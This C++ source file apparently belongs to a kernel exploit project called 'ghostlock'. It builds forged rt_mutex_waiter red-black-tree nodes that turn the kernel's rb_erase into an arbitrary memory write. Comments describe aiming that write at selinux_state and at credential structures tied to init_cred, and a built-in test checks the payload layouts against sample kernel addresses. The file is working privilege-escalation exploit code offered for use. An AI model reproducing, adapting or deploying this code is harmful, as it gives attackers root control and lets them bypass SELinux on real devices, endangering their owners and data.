#include "memory/payload_builder.h"

#include <cstring>

#include <algorithm>
#include <array>
#include <cstddef>
#include <iterator>
#include <span>

using namespace ghostlock;

namespace {
    void store64(unsigned char *p, size_t off, uint64_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    uint64_t load64(const unsigned char *p, size_t off) {
        uint64_t value;
        memcpy(&value, p + off, sizeof(value));
        return value;
    }

    bool span_store64(std::span<std::byte> bytes, size_t offset,
                      uint64_t value) noexcept {
        if (offset > bytes.size() || sizeof(value) > bytes.size() - offset) {
            return false;
        }
        memcpy(bytes.data() + offset, &value, sizeof(value));
        return true;
    }
} // namespace

namespace ghostlock::memory {
    bool encode_compact_waiter(std::span<std::byte> waiter,
                               const WriteRequest &request,
                               const PayloadWriteLayout &layout) noexcept {
        if (waiter.size() < kCompactWaiterBytes) return false;
        if (layout.right) {
            return span_store64(waiter, 0x18, layout.right) &&
                   span_store64(waiter, 0x20, 0) &&
                   span_store64(waiter, 0x28, request.target);
        }
        return span_store64(waiter, 0x18, layout.parent) &&
               span_store64(waiter, 0x20, layout.right) &&
               span_store64(waiter, 0x28, layout.left);
    }

    bool encode_multicast_w1_tree(std::span<std::byte> buffer,
                                  std::size_t waiter_offset, std::uintptr_t target,
                                  std::uintptr_t write_value) noexcept {
        /* 6.1 flat rt_mutex_waiter: tree_entry.__rb_parent_color @+0x00,
         * rb_right @+0x08, rb_left @+0x10. The forged node is RED with
         * parent = target-8, right = NULL, left = write value: rb_erase's
         * transplant takes the left child and __rb_change_child writes it
         * through the forged parent's right slot = *(target).
         * Only the 24-byte tree_entry is overlayable (measured geometry:
         * it ends exactly at the greqs copy tail); pi_tree_entry/task/lock
         * stay at the kernel's stale real values, so the walk locks the
         * real mutex, performs the forged transplant write, then
         * self-cycles on the waiter task and returns safely. */
        if (waiter_offset + 0x18 > buffer.size()) return false;
        auto at = [&](std::size_t off) {
            return buffer.subspan(waiter_offset + off, 8);
        };
        const std::uintptr_t parent_color = (target - 8) | 1; /* RB_RED */
        std::span<const std::byte> pc(reinterpret_cast<const std::byte *>(&parent_color), 8);
        std::span<const std::byte> wv(reinterpret_cast<const std::byte *>(&write_value), 8);
        std::span<std::byte> right = at(0x08);
        std::span<std::byte> left = at(0x10);
        std::copy(pc.begin(), pc.end(), buffer.subspan(waiter_offset, 8).begin());
        std::fill(right.begin(), right.end(), std::byte{0});
        std::copy(wv.begin(), wv.end(), left.begin());
        return true;
    }

    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias) {
        PayloadWriteLayout layout = {
            .fops = default_fops,
        };
        if (!request || request->mode == WriteMode::Disabled) return layout;

        if (request->preserve_child) {
            /* Write 1 (selinux): child = base+0x10100 → byte0=0, byte1=1, and
         * bit16 forced to 1 so the byte landing on selinux_state.initialized
         * (byte 2, bit 0) stays set regardless of the sprayed page's physical
         * 64KB alignment. base+0x100 left bit16 to the page frame, and the
         * sequential mm leak kept hitting the same 64KB block - every page
         * in a run was accepted or rejected together. */
            layout.right = request->mode == WriteMode::Credential
                               ? init_cred_alias
                               : page_base + 0x10100;
        }
        if (request->mode == WriteMode::Credential) {
            layout.fops = credential_fops;
            layout.needs_credential_copy = true;
        }
        layout.parent = request->target - 8;
        return layout;
    }

    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout) {
        if (!waiter || !request || !layout) return;
        (void) encode_compact_waiter(
            {
                reinterpret_cast<std::byte *>(waiter),
                kCompactWaiterBytes
            },
            *request, *layout);
    }

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!request || !layout || request->mode == WriteMode::Disabled) return 0;
        return request->preserve_child ? layout->right != 0 : layout->right == 0;
    }

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!payload_write_layout_matches_request(request, layout)) return 0;
        /* W1 stores its page-derived value across selinux_state fields. An even
     * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
        if (request->mode == WriteMode::Zero && request->preserve_child &&
            ((layout->right >> 16) & 1) == 0)
            return 0;
        return 1;
    }

    int32_t payload_builder_fixed_vector_test(void) {
        static const struct {
            uintptr_t target;
            WriteMode mode;
            int32_t leaf;
            uintptr_t expected_pc;
            uintptr_t expected_left;
        } vectors[] = {
            {
                0xffffff8000123000ULL, WriteMode::Zero, 1,
                0xffffff8000122ff8ULL, 0
            },
            {
                0xffffff8000124000ULL, WriteMode::Zero, 0,
                0xffffff8800210100ULL, 0xffffff8000124000ULL
            },
            {
                0xffffff8000125000ULL, WriteMode::Credential, 0,
                0xffffff802abfd588ULL, 0xffffff8000125000ULL
            },
        };
        const uintptr_t page = 0xffffff8800210000ULL;
        const uintptr_t init_cred = 0xffffff802abfd588ULL;
        for (size_t i = 0; i < std::size(vectors); ++i) {
            std::array<unsigned char, kCompactWaiterBytes> current{};
            const WriteRequest request = WriteRequest::make(
                vectors[i].target, vectors[i].mode, vectors[i].leaf != 0);
            PayloadWriteLayout layout = payload_write_layout(
                &request, page, 0x1111, 0x2222, init_cred);
            build_compact_waiter_payload(current.data(), &request, &layout);
            if (load64(current.data(), 0x18) != vectors[i].expected_pc ||
                load64(current.data(), 0x20) != 0 ||
                load64(current.data(), 0x28) != vectors[i].expected_left ||
                !payload_write_layout_matches_request(&request, &layout) ||
                !payload_write_layout_accepts_page(&request, &layout))
                return 0;
        }
        const WriteRequest w1 = WriteRequest::make(
            0xffffff8000124000ULL, WriteMode::Zero, false);
        PayloadWriteLayout rejected = payload_write_layout(
            &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
        if (!payload_write_layout_accepts_page(&w1, &rejected)) return 0;
        /* The acceptance check still rejects an even byte-2 bit: clear bit 16
     * by hand and the same layout must be refused. */
        rejected.right &= ~(1ULL << 16);
        if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
        rejected.right = 0;
        if (payload_write_layout_matches_request(&w1, &rejected)) return 0;

        std::array < unsigned char, 0x80 > tree_stamp{};
        const uint64_t expect_pc = 0xffffff8800001000ULL | 1; /* RED parent */
        const uint64_t expect_wv = 0xffffff8800005800ULL;     /* write value */
        if (!encode_multicast_w1_tree(
            {reinterpret_cast<std::byte *>(tree_stamp.data()), tree_stamp.size()},
            0x20, 0xffffff8800001008ULL, 0xffffff8800005800ULL))
            return 0;
        if (load64(tree_stamp.data(), 0x20) != expect_pc ||
            load64(tree_stamp.data(), 0x28) != 0 ||
            load64(tree_stamp.data(), 0x30) != expect_wv)
            return 0;
        std::byte undersized[0x2f]{};
        if (encode_compact_waiter(undersized, w1, rejected)) return 0;
        /* Multicast W1 tree geometry that would run past the supplied span is
     * rejected instead of written out of bounds. */
        std::array<std::byte, 0x40> multicast_small{};
        if (encode_multicast_w1_tree(multicast_small, 0x20, 0x1111, 0x2222))
            return 0;
        return 1;
    }
} // namespace ghostlock::memory
